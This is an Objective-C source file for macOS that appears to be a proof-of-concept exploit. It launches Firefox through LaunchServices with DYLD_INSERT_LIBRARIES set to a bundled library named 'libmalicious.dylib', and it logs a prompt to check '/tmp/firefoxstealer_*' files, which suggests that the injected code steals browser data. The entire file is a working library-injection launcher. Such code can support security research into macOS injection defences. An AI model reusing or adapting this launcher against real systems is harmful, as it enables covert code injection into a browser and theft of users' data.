#import <Foundation/Foundation.h>
#pragma clang diagnostic ignored "-Wdeprecated-declarations"

bool openUsingLSWith(NSString *path, NSDictionary<NSString*, NSString*> *env) {
    
    FSRef appFSURL;
    OSStatus stat = FSPathMakeRef((const UInt8 *)[path UTF8String], &appFSURL, NULL);
    
    if (stat != errSecSuccess) {
        NSLog(@"Something wrong: %d",stat);
        return false;
    }

    LSApplicationParameters appParam;
    appParam.version = 0;
    appParam.flags = kLSLaunchDefaults;
    appParam.application = &appFSURL;

    appParam.argv = NULL;
    appParam.environment = (__bridge CFDictionaryRef)env;
    appParam.asyncLaunchRefCon = NULL;
    appParam.initialEvent = NULL;

    CFArrayRef array = (__bridge CFArrayRef)@[];
    stat = LSOpenURLsWithRole(array, kLSRolesAll, NULL, &appParam, NULL, 0);

    if (stat != errSecSuccess) {
        NSLog(@"Something went wrong: %d",stat);
        return false;
    }
    
    return true;
}

bool launchFirefox() {
    
    NSString *firefoxPath = @"/Applications/Firefox.app";
    NSString *maliciousDylibPath = [[NSBundle mainBundle] pathForResource:@"libmalicious" ofType:@"dylib"];;
    NSDictionary *env = @{@"DYLD_INSERT_LIBRARIES":maliciousDylibPath};
    
    return openUsingLSWith(firefoxPath, env);
}

int main(int argc, const char * argv[]) {

    if(launchFirefox()) {
        NSLog(@"Firefox launched correctly");
        NSLog(@"Now check /tmp/firefoxstealer_* files");
        return 0;
    }
    
    NSLog(@"Error occured...");
    return -1;
}
